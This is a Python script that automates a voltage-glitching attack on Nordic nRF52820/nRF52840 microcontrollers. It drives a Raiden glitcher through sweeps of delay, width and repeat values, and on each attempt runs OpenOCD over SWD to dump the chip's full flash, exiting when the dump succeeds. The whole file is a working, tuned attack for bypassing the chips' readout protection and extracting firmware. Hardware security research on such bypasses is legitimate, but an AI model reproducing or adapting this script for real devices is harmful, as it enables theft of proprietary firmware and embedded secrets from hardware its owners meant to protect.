from raiden_python import raiden 
import time
import os
import subprocess
import pylink.jlink
import random
from collections import namedtuple
from chipshouter import ChipSHOUTER


raiden = raiden.Raiden(mhz=200, serial_dev="/dev/tty.usbserial-210319A279441", baud= 115200, ticks= True, debug=False) 

print(raiden.get_buildtime())
raiden.arm(0)
raiden.reset_glitcher()

status = False

raiden.set_param(param="CMD_VSTART", value= 1)
raiden.set_param(param="CMD_GLITCH_MAX", value= 1)  
gap = 200
count=1

Range = namedtuple('Range', ['min', 'max', 'step'])
# delay_range = Range(10813000,10815000, 1) #NRF52840
# delay_range = Range(10781000,10796000, 100)#NRF52840
# delay_range = Range(11470136,11470150, 1) #NRF52820
# delay_range = Range(11520574,11470150, 1) #NRF52820
# delay_range = Range(11544258,11470150, 1) #NRF52820
# delay_range = Range(11544239,11470150, 1) #NRF52820

delay_range = Range(11567200,11574300, 1) #NRF52820
width_range = Range(2100, 2100, 100)
repeat_range = Range(1,3, 1)
repeat = repeat_range.min
delay = delay_range.min

width = width_range.min

while True:
    delay = delay_range.min
    while delay <= delay_range.max:
        width = width_range.min
        while width <= width_range.max:
            while repeat <= repeat_range.max:
                raiden.arm(0)
                # width = random.randrange(1, 28, 1)
                # width = random.randrange(12000, 28000, 1000)
                # width = 110
                # width = 600
                # gap = random.randrange(100, 150,10)
                raiden.reset_glitcher()
                raiden.set_target_power("auto")
                raiden.set_param(param="CMD_GLITCH_DELAY", value= delay)
                raiden.set_param(param="CMD_GLITCH_WIDTH", value= width)
                raiden.set_param(param="CMD_GLITCH_GAP", value= gap)
                raiden.set_param(param="CMD_GLITCH_COUNT", value= count)
                exit_status = os.system('openocd -s /opt/homebrew/Cellar/open-ocd/0.11.0/share/openocd/scripts -f ./interface/jlink.cfg -c "transport select swd" -f ./target/nrf52.cfg -c "init;dump_image nrf52_flash.bin 0x0 0x80000"')
                # print("command status: {}".format(exit_status))
                raiden.arm(1)

                # result = subprocess.getoutput('openocd -s /opt/homebrew/Cellar/open-ocd/0.11.0/share/openocd/scripts -f ./interface/jlink.cfg -c "transport select swd" -f ./target/nrf52.cfg -c "init;dump_image nrf52_dumped.bin 0x0 0x80000;exit"')
                while not raiden.is_finished():
                    pass
                # print(result)
                # if "nrf52.cpu: hardware has 6 breakpoints, 4 watchpoints" in result or "dumped" in result:
                #     raiden.reset_glitcher()
                #     raiden.arm(0)
                #     exit(0)
               
                print("Glitch attempt: delay:{} width:{} count:{} gap:{} repeat: {}".format(delay, width, count, gap, repeat))
                # exit_status = os.system('openocd -s /usr/local/share/openocd/scripts -f ./interface/jlink.cfg -c "transport select swd" -f ./target/nrf52.cfg -c "init;dump_image nrf52_flash.bin 0x0 0x80000;exit"') // 256
                # print("command status: {}".format(exit_status))
                if exit_status == 0:
                    print("Glitch success: status:{} delay:{} width:{} count:{} gap:{} reapeat {}".format(status, delay, width, count, gap, repeat))
                    raiden.arm(0)
                    raiden.reset_glitcher()
                    exit(0)
                else:
                    raiden.arm(0)
                    raiden.reset_glitcher()
                    raiden.set_param(param="CMD_RESET_TARGET", value= 10000000)
                repeat +=1
                print("glitch cycle completed")
            repeat = repeat_range.min
            width +=100
        delay +=1